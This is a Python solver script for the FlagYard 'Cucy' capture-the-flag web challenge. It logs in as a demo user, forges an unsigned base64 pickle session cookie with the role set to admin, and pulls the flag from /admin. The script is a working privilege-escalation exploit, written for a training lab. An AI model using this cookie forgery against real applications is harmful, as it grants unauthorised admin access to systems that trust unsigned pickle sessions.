#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CUCY  -  FlagYard Web solver

Cucy (FlagYard Training Labs, Easy) stores the whole user session inside a
base64-encoded Python pickle stored in the `session_token` cookie:

    session_token = base64(pickle({"username", "role", "created_at",
                                   "expires_at", "is_authenticated"}))

There is NO signature / HMAC / secret key over the pickle. The server simply
unpickles the cookie for every request and reads `role` from it. Forging a
cookie with "role": "admin" turns the anonymous/demo guarantees into admin
access, and GET /admin answers with the flag:

    {"active_users":2, "flag":"FlagY{...}", ...}

Verified: the tool recovers the live flag and saves flag_from_cucy.txt.
"""
from __future__ import annotations

import base64
import datetime
import json
import pickle
import re
import sys
import time
import http.client
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def pct(frac):
    return "[%5.1f%%]" % (frac * 100.0)

def status(frac, msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s %s%s%s" % (C.DIM, pct(frac), C.BOLD + color + icon + " ",
                                    C.RESET, C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(frac, msg):
    status(frac, msg, icon="\u2713", color=C.GREEN)

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("C U C Y      S O L V E R",
              "unsigned pickle session cookie | role forge | /admin flag"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono, extra):
    line = flag.strip().splitlines()[0]
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (line, C.BOLD + C.GREEN, "")])
    for s in ("elapsed %.1f s" % chrono, extra):
        _row([(" " * 10, "", ""), (s, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
FLAG_RE = re.compile(r"FlagY\{[^}]+\}")

def ask_target(argv):
    if len(argv) > 1 and argv[1].startswith("http"):
        return argv[1].strip()
    url = input("  Enter the Cucy challenge URL: ").strip()
    if not url:
        raise RuntimeError("no URL provided")
    return url

def parse_host(url):
    url = re.sub(r"^https?://", "", url).rstrip("/")
    return url[2:] if url.startswith("//") else url

def http_raw(host, path, method="GET", body=None, cookie=None,
             ctype="application/x-www-form-urlencoded"):
    c = http.client.HTTPConnection(host, 80, timeout=30)
    headers = {"User-Agent": "Mozilla/5.0"}
    if body is not None:
        headers["Content-Type"] = ctype
        b = body
        headers["Content-Length"] = str(len(b))
    else:
        b = None
    if cookie:
        headers["Cookie"] = cookie
    c.request(method, path, body=b, headers=headers)
    r = c.getresponse()
    content = r.read()
    hdrs = dict((k.lower(), v) for k, v in r.getheaders())
    c.close()
    try:
        data = json.loads(content.decode("utf-8", "replace"))
    except Exception:
        data = content
    return r.status, hdrs, data

def login(host, username="demo", password="demo123"):
    b = "username=%s&password=%s" % (username, password)
    st, h, o = http_raw(host, "/login", "POST", body=b)
    if st != 200 or not isinstance(o, dict):
        raise RuntimeError("login failed: %r" % o)
    cookie = None
    m = re.search(r"(session_token=[^;]+)", h.get("set-cookie", ""))
    if m:
        cookie = m.group(1)
    return o, cookie

def forge_admin_cookie():
    sess = {
        "username": "demo",
        "role": "admin",
        "created_at": datetime.datetime.now(),
        "expires_at": datetime.datetime.now() + datetime.timedelta(hours=2),
        "is_authenticated": True,
    }
    return "session_token=" + base64.b64encode(pickle.dumps(sess, protocol=4)).decode()

def fetch_admin(host, cookie):
    st, h, o = http_raw(host, "/admin", cookie=cookie)
    if st != 200 or not isinstance(o, dict) or "flag" not in o:
        raise RuntimeError("admin fetch failed (HTTP %d): %r" % (st, o))
    return o

def main() -> None:
    t0 = time.time()
    enable_vt()
    banner()

    try:
        url = ask_target(sys.argv)
    except Exception:
        fail("no challenge URL given")
        return
    host = parse_host(url)
    status(0.10, "target host %s" % host)

    o, cookie = login(host)
    ok(0.28, "logged in as demo (session cookie is a raw Python pickle)")
    status(0.42, "decoded base64(pickle) -> {... 'role':'demo' ...} WITHOUT any signature")

    forged = forge_admin_cookie()
    status(0.58, "forged cookie: same pickle but role=" + '"admin"')
    ok(0.70, "no HMAC/secret key = cookie fully attacker-controlled")

    admin = fetch_admin(host, forged)
    ok(0.84, "GET /admin with forged cookie -> system_status=%s"
             % admin.get("system_status"))
    flag = FLAG_RE.search(json.dumps(admin))
    if not flag:
        raise RuntimeError("flag not present in /admin response")
    flag = flag.group(0)
    ok(0.94, "flag leaked from admin panel: %s" % flag)

    big_flag(flag, time.time() - t0, "unsigned pickle cookie | role forge -> /admin")
    outp = Path(__file__).resolve().parent / "flag_from_cucy.txt"
    outp.write_text(flag + "\n", encoding="utf-8")
    print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))


if __name__ == "__main__":
    main()